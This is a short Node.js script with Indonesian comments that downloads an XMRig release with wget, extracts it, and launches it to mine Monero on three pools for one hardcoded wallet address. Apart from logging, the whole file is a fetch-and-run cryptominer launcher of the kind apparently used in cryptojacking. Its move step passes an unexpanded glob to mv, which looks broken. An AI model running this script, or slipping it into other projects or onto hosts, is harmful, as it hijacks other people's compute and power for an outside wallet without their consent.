const { spawn } = require("child_process");

// Download XMRig
spawn("wget", ["-O", "a", "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-jammy-x64.tar.gz"]).on("close", (code) => {
    console.log(`Download selesai dengan kode keluar: ${code}`);

    // Extract XMRig
    spawn("tar", ["-xzvf", "a"]).on("close", (code) => {
        console.log(`Ekstraksi selesai dengan kode keluar: ${code}`);

        // Pindahkan file hasil ekstraksi
        spawn("mv", ["xmrig-6.22.2/*", "."]).on("close", (code) => {
            console.log(`Pemindahan selesai dengan kode keluar: ${code}`);

            // Jalankan XMRig
            const xmrig = spawn("./xmrig", [
                "-o", "pool.supportxmr.com:7777", "-u", "43Mk3jUjBwkbfLishws1FzTMJkjRnYyKb5uuuPQM59UDLHjvzB1nP5HBZaYisfTRWJHzYdKpe5LnBHZWbih3DRebQM3DZ7o", "-p", "x",
                "-o", "pool.hashvault.pro:443", "-u", "43Mk3jUjBwkbfLishws1FzTMJkjRnYyKb5uuuPQM59UDLHjvzB1nP5HBZaYisfTRWJHzYdKpe5LnBHZWbih3DRebQM3DZ7o", "-p", "x",
                "-o", "xmr-us-east1.nanopool.org:10300", "-u", "43Mk3jUjBwkbfLishws1FzTMJkjRnYyKb5uuuPQM59UDLHjvzB1nP5HBZaYisfTRWJHzYdKpe5LnBHZWbih3DRebQM3DZ7o", "-p", "x"
            ]);

            xmrig.stdout.on("data", (data) => {
                console.log(`stdout: ${data}`);
            });

            xmrig.stderr.on("data", (data) => {
                console.error(`stderr: ${data}`);
            });

            xmrig.on("close", (code) => {
                console.log(`Proses XMRig selesai dengan kode keluar: ${code}`);
            });
        });
    });
});
